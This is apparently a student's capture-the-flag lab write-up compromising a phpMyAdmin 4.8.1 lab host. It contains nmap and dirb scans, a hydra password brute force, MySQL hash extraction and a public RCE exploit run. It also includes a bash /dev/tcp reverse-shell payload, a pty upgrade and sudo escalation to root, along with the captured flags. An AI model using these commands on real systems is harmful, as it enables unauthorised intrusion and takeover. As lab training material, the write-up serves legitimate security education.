# Nancurinir

Target:  nancurunir.shire.org (10.0.5.28)

## nmap scan
```
└─$ sudo nmap 10.0.5.28 -sS -sV -p-       
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-24 11:36 EDT
Nmap scan report for 10.0.5.28
Host is up (0.0014s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
```

## directory enumeration
```
**└─$ dirb http://10.0.5.28 -r

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Mar 24 11:48:54 2026
URL_BASE: http://10.0.5.28/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.5.28/ ----
+ http://10.0.5.28/index.html (CODE:200|SIZE:269)                                          
==> DIRECTORY: http://10.0.5.28/phpmyadmin/                                                
+ http://10.0.5.28/server-status (CODE:403|SIZE:274)                                       
                                                                                           
-----------------
END_TIME: Tue Mar 24 11:48:57 2026
DOWNLOADED: 4612 - FOUND: 2
**
```

## DEAD END - guessing passwords
```
rsmangler --file gandalf.small.txt -o gandalf.mangled.txt --min 8 --max 12
```
php-myadmin brute force
```
hydra -l gandalf -P gandalf.mangled.txt 10.0.5.28 http-get /phpmyadmin/ -t 4
```
results
```
└─$ hydra -l gandalf -P gandalf.mangled.txt 10.0.5.28 http-get /phpmyadmin/ -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-24 11:51:08
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1597 login tries (l:1/p:1597), ~400 tries per task
[DATA] attacking http-get://10.0.5.28:80/phpmyadmin/
[80][http-get] host: 10.0.5.28   login: gandalf   password: staffwizard
[80][http-get] host: 10.0.5.28   login: gandalf   password: glamdring
[80][http-get] host: 10.0.5.28   login: gandalf   password: wizardstaff
[80][http-get] host: 10.0.5.28   login: gandalf   password: wizardnarya
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-24 11:51:09
```
this didn't work. it was just `shallnotpass` (found in source code)

## phpmyadmin
password: shallnotpass

found in index source code:
```
<!DOCTYPE html>
<html>
	<body>
		<h1>Gandalf Bio:</h1>

		<p>Gandalf is a legendary wizard of Middle-earth! His preferred weapons are his wizard staff, glamdring, and narya!</p>
		
	        <img src="shallnotpass.gif" alt="shallnotpass">

	</body>

</html>
```

<img width="876" height="468" alt="image" src="https://github.com/user-attachments/assets/ee1b9a65-f745-47c9-8ebf-2f57f5157cb4" />
<img width="397" height="231" alt="image" src="https://github.com/user-attachments/assets/4ed36c86-d218-488e-9953-cd4585becc05" />

phpmyadmin version 4.8.1


able to find msql user data un the mysql database user table

<img width="1218" height="551" alt="image" src="https://github.com/user-attachments/assets/e993b948-fb95-46ff-ae99-a1c1b86d38b1" />

root acct authentication string: *2B72EB4F3B82A23BA9987F76675B83FE9FE8DDC8

<img width="1033" height="111" alt="image" src="https://github.com/user-attachments/assets/312b3499-d364-4b72-b88f-7ba2ce79d60d" />

this hash is for: `gandalfthewhite`, might be the same password for gandalf ssh user


exploit found here: https://www.exploit-db.com/exploits/50457

```
┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/week10]
└─$ python3 50457.py 10.0.5.28 80 /phpmyadmin/ gandalf shallnotpass whoami
/home/champuser/ChamplainTechJournals/eth-hack-sec335/week10/50457.py:29: SyntaxWarning: invalid escape sequence '\s'
  s = re.search('token"\s*value="(.*?)"', content)
/home/champuser/ChamplainTechJournals/eth-hack-sec335/week10/50457.py:50: SyntaxWarning: invalid escape sequence '\d'
  s = re.search('PMA_VERSION:"(\d+\.\d+\.\d+)"', content)
/home/champuser/ChamplainTechJournals/eth-hack-sec335/week10/50457.py:64: SyntaxWarning: invalid escape sequence '\w'
  s = re.search('logged_in:(\w+),', content)
www-data
```


reverse shell on port 4479
```
python3 50457.py 10.0.5.28 80 /phpmyadmin/ gandalf shallnotpass "bash -c 'exec bash -i &>/dev/tcp/10.0.17.26/4479 <&1'""
```

once logged in to www-data, swithc to gandalf user with `gandalfthewhite password`, you will get a blank termininal and need to re-instate the session using the following command
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<img width="320" height="58" alt="image" src="https://github.com/user-attachments/assets/c25feaa0-cffe-42b8-8ab3-110aef7fa3a2" />
user flag: "82745644-c7f3-4250-acba-aa453abb2249"



## root flag

once you get gandalf access, simp1y `sudo su` to become root

<img width="790" height="288" alt="image" src="https://github.com/user-attachments/assets/68b4390c-8951-4b08-9646-3709c8e4338f" />

root flag: "22815793-a31c-42e5-ab46-a42241152c26"
